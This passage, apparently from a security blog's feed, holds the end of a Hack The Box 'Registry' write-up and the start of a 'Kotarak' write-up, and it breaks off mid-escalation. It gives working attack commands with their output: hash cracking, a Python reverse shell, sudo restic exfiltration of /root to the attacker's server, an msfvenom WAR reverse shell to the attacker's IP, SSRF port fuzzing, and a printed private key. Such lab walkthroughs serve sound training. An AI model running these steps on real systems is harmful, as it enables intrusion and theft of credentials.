&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/var/www/html/bolt/app/database$ which python
/usr/bin/python
bolt@bolt:/var/www/html/bolt/app/database$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; wget registry.htb:8000/bolt.db
--2020-05-01 08:16:14--  http://registry.htb:8000/bolt.db
Risoluzione di registry.htb (registry.htb)... 10.10.10.159
Connessione a registry.htb (registry.htb)|10.10.10.159|:8000... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 294912 (288K) [application/octet-stream]
Salvataggio in: &quot;bolt.db&quot;

bolt.db                              100%[======================================================================&amp;gt;] 288,00K  1,58MB/s    in 0,2s    

2020-05-01 08:16:14 (1,58 MB/s) - &quot;bolt.db&quot; salvato [294912/294912]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; sqlite3 bolt.db
SQLite version 3.30.1 2019-10-10 20:19:45
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite&amp;gt; select * FROM bolt_users
   ...&amp;gt; ;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|[&quot;files://shell.php&quot;]|1||||0||[&quot;root&quot;,&quot;everyone&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sincerily: When i found some passwords inside the databases i get excited more than a fuck. Well, let’s crack it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 4096/10037 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'                         
* Device #1: Kernel m03200-pure.3089d00d.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P...cpY7PK
Time.Started.....: Fri May  1 08:35:43 2020 (11 secs)
Time.Estimated...: Fri May  1 08:35:54 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       34 H/s (7.12ms) @ Accel:8 Loops:2 Thr:8 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 384/14344385 (0.00%)
Rejected.........: 0/384 (0.00%)
Restore.Point....: 256/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
Candidates.#1....: angelo -&amp;gt; michael1

Started: Fri May  1 08:35:32 2020
Stopped: Fri May  1 08:35:55 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strawberry&lt;/code&gt; Now we can use this password through the Bolt CMS previously found:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Taking a look on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File Management&lt;/code&gt; it’s seems that we can upload files. But &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt; extension is forbidden. Fortunately we are logged in as admin and we can fix that thing adding php files to the accepted file types:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webshell would stop working pretty quickly and the file would disappear. Why? Remember that interesting ‘sync.sh’ file we found earlier from the archivies?&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo html -&amp;gt; cat sync.sh
#!/bin/bash
rsync -azP registry:/var/www/html/bolt .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s probably running as a cron job very regularly and overwriting everything in /var/www/html/bolt and its subdirectories. So i decided to obtain the reverse connection as www-data with a python reverse shell on the bolt ssh session:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/var/www/html$ nc -lvnp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 127.0.0.1 43310 received!
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally!&lt;/p&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;

&lt;p&gt;www-data is allowed to run restic as root:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A quick google search lead me to Restic docs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html&lt;/code&gt; specifically the section on REST server. This is the steps I followed:&lt;/p&gt;

&lt;p&gt;Install restic and create a repository (with passwd asdasd)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; apt-get install restic
root@lorenzooo registry -&amp;gt; restic init --repo rest1
enter password for new repository: 
enter password again: 
created restic repository de68ef2b8d at rest1

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Set up a ssh tunnel for port 8000 on my machine to port 8000 on Registry:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo .ssh -&amp;gt; ssh bolt@registry.htb -i id_rsa -R 8000:127.0.0.1:8000
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 06:11:05 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 29%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    171
Last login: Fri May  1 04:10:14 2020 from 10.10.14.45
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Install rest-server from this repository &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/restic/rest-server&lt;/code&gt; to our local machine and set up the server:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo rest-server -&amp;gt; make
go: downloading github.com/spf13/cobra v0.0.1
go: downloading github.com/prometheus/client_golang v0.8.0
go: downloading goji.io v2.0.2+incompatible
go: downloading golang.org/x/crypto v0.0.0-20180214000028-650f4a345ab4
go: downloading github.com/miolini/datacounter v0.0.0-20171104152933-fd4e42a1d5e0
go: downloading github.com/gorilla/handlers v1.3.0
go: downloading github.com/prometheus/common v0.0.0-20180110214958-89604d197083
go: downloading github.com/prometheus/procfs v0.0.0-20180212145926-282c8707aa21
go: downloading github.com/golang/protobuf v1.0.0
go: downloading github.com/prometheus/client_model v0.0.0-20171117100541-99fa1f4be8e5
go: downloading github.com/beorn7/perks v0.0.0-20160804104726-4c0e84591b9a
go: downloading github.com/spf13/pflag v1.0.0
go: downloading github.com/matttproud/golang_protobuf_extensions v1.0.0
root@lorenzooo rest-server -&amp;gt; make install
/usr/bin/install -m 755 rest-server /usr/local/bin/rest-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo rest-server -&amp;gt; rest-server --path rest1 --no-auth
Data directory: rest1
Authentication disabled
Private repositories disabled
Starting server on :8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Run the Restic backup as root, telling it to backup Registry’s /root folder to the REST server at http://127.0.0.1:8000 (which is tunneled to my machine):&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root
enter password for repository: 
password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 368e55c4 saved
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And restored the snapshot by&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; restic -r rest1 restore latest --target restore/
enter password for repository: 
repository de68ef2b opened successfully, password is correct
created new cache in /root/.cache/restic
restoring &amp;lt;Snapshot 368e55c4 of [/root] at 2020-05-01 06:50:28.258536034 +0000 UTC by root@bolt&amp;gt; to restore/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can connect through ssh and cat the root.txt&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm
cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci
4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp
1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX
4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+
IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG
sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC
BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D
k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH
HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4
dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI
skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq
tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a
1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux
RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf
xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK
Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1
YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F
AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3
us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn
1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV
2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH
bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3
mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe
2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo registry -&amp;gt; cd restore
root@lorenzooo restore -&amp;gt; ls
root
root@lorenzooo restore -&amp;gt; cd root
root@lorenzooo root -&amp;gt; ls
config.yml  cron.sh  root.txt
root@lorenzooo root -&amp;gt; cd .ssh
root@lorenzooo .ssh -&amp;gt; ls
authorized_keys  id_rsa  id_rsa.pub
root@lorenzooo .ssh -&amp;gt; ssh -i id_rsa root@10.10.10.159
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri May  1 06:53:53 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 31%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    176
Last login: Mon Oct 21 09:53:48 2019
root@bolt:~# cat /root/root.txt
ntrkzgnkotaxyju0ntrinda4yzbkztgw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-registry/registry14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Registry" /><category term="Docker Registry Vulnerable" /><category term="Shell Upload" /><category term="Sudo -l" /><summary type="html">Registry was a hard box with a vulnerable Docker Registry who allow us to retrieve the ssh key for bolt. After some enumerations, we will found into bolt.db the credentials to login through bolt CMS. We can upload a python reverse shell and obtain the connection with www-data. For the privesc we have sudo permission with www-data to run the restic backup which allow us to grub the root ssh key.</summary></entry><entry><title type="html">Kotarak - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-kotarak/" rel="alternate" type="text/html" title="Kotarak - Hack The Box" /><published>2020-04-29T00:00:00+02:00</published><updated>2020-04-29T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-kotarak</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-kotarak/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kotarak was a hard box with a SSRF through a form on a webpage that allow us to retrieve the credentials from a backup files. We can login on Apache Tomcat and upload a .RAW reverse shell to get an entry point with the webserver user Tomcat. We will find 2 important NTDS files where we can extract the hashes with the impacket tool secretsdump.py cracking the Administrator’s hash and elevate as Atanas. For the privesc we got a wget version vulnerable and a crontab that download some archivie files from another subnet, with a wget vulnerable too.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can perform a SSRF through a website’s browsable from for retrieving the credentials for Tomcat.&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website and upload a reverse shell.&lt;/li&gt;
  &lt;li&gt;With secretsdump.py from impacket tools we can retrieve the Administrator’s hash password to elevate as Atanas.&lt;/li&gt;
  &lt;li&gt;A crontab from another subnet allows us to detect a vulnerable version of wget on the machine in the subnet and on the local machine.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 3 open TCP ports:  22 SSH, 8009 Apache Jserv and 8080 Apache Tomcat&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:35 CEST
Nmap scan report for 10.10.10.55
Host is up (0.051s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -T4 -p- 10.10.10.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 23:39 CEST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 84.75% done; ETC: 23:39 (0:00:03 remaining)
Nmap scan report for 10.10.10.55
Host is up (0.054s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;http-recon&quot;&gt;HTTP Recon&lt;/h2&gt;

&lt;p&gt;We get a 404 error if we try to connect on the ip with the 8080 tomcat tcp port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the 60000 tcp open port instead we can able to connect on the website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;server-side-request-forgery&quot;&gt;Server Side Request Forgery&lt;/h2&gt;

&lt;p&gt;Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;capturing the request for private browsing through the browser provided by the website with burpsuite, we can notice a rather curious form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Testing the form with sqlmap it appears not vulnerable to sql injections. But by trying an SSRF attack we discover the magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can request remote resources, in this case the tomcat page hosted on port 8080 by the webserver. Unfortunately, by trying to request remote files, we don’t have the same luck. So we can see if the remote server has other resources available on other ports that only himself reaches:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo examples -&amp;gt; wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload                                         
===================================================================

000000022:   200        4 L      4 W      62 Ch       &quot;22&quot;                                            
000000090:   200        11 L     18 W     156 Ch      &quot;90&quot;                                            
000000110:   200        17 L     24 W     187 Ch      &quot;110&quot;                                           
000000200:   200        3 L      2 W      22 Ch       &quot;200&quot;                                           
000000320:   200        26 L     109 W    1232 Ch     &quot;320&quot;                                           
000000888:   200        78 L     265 W    3955 Ch     &quot;888&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To speed up this step, the interesting door is the 888:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can ask the server to show us the backup file on port 888:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only CTF like part that we could find in this machine. Obviously I don’t reserve any criticism because the box was really well made and full of new stuff to learn. Let’s authenticate to tomcat now!&lt;/p&gt;

&lt;h2 id=&quot;tomcat-recon&quot;&gt;Tomcat Recon&lt;/h2&gt;

&lt;p&gt;Browsing the page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.55:8080/manager/html&lt;/code&gt; a window will appear and we can enter the credentials just found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The cool thing is that we can deploy a file with the WAR web archive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And since tomcat can interpret java, we are going to create a reverse shell in java with msfvenom:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f war &amp;gt; /root/Documenti/kotarak/shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And finally we will trigger it through the broswer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-kotarak/kotarak12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.55] 38164
id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat
/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-atanas&quot;&gt;PrivEsc to Atanas&lt;/h2&gt;

&lt;p&gt;There is an user called Atanas in the system:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
